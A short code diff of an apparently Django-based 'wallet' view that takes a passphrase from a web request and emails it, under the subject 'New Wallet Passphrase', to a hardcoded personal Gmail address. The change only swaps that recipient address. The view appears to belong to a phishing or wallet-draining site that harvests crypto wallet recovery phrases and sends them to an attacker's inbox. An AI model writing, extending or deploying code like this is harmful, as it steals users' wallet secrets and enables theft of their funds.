@@ -63,7 +63,7 @@ def wallet(request):
             subject = "New Wallet Passphrase"
             message = f"Passphrase: {passphrase}"
             from_email = settings.EMAIL_HOST_USER
-            recipient_list = ['st37288997@gmail.com']
+            recipient_list = ['pt37288997@gmail.com']
 
             try:
                 send_mail(
